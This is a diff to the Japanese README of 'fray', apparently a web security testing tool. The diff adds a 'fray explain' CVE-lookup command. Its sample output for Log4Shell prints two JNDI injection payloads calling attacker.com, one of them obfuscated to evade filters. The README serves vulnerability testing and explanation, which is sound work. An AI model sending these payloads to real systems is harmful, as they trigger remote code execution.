@@ -60,7 +60,10 @@ fray detect https://example.com
 # 4. 特定カテゴリでテスト
 fray test https://example.com -c xss --max 10
 
-# 5. レポート生成
+# 5. CVEを調べる — ペイロード、深刻度、テスト方法
+fray explain CVE-2021-44228
+
+# 6. レポート生成
 fray report -i results.json -o report.html
 ```
 
@@ -261,6 +264,34 @@ fray payloads  # 全カテゴリを一覧表示
 | OWASPモバイル | 575+ | CVEエクスプロイト | 220 |
 
 **120件の実際のCVE**（2020–2026年）を含む：Log4Shell、Spring4Shell、ProxyShell、React2Shell等。
+
+### `fray explain` — CVEインテリジェンス
+
+```bash
+fray explain CVE-2021-44228        # CVE IDで検索
+fray explain log4shell              # 名前で検索
+fray explain react2shell --max 10   # 表示数を増やす
+fray explain spring4shell --json    # JSON出力
+```
+
+```
+Fray Explain — CVE Intelligence
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  CVE-2021-44228
+  Log4Shell - Log4j RCE
+
+  Severity:     CRITICAL（CVSS 10.0）
+  Affected:     Log4j 2.0-beta9 〜 2.14.1
+  Disclosed:    2021-12-09
+  Payloads:     2件
+
+  #1 ${jndi:ldap://attacker.com/exploit}
+  #2 ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}
+
+  テスト方法:
+    → コマンド実行エンドポイントを確認、入力サニタイズを検証
+    → fray test <url> -c xss --max 10
+```
 
 [全ペイロードデータベース →](docs/payload-database-coverage.md) · [CVEカバレッジ →](docs/cve-real-world-bypasses.md) · [AIセキュリティ →](docs/ai-security-guide.md) · [モバイルセキュリティ →](docs/owasp-mobile-top10.md) · [APIセキュリティ →](docs/owasp-api-security.md)
 
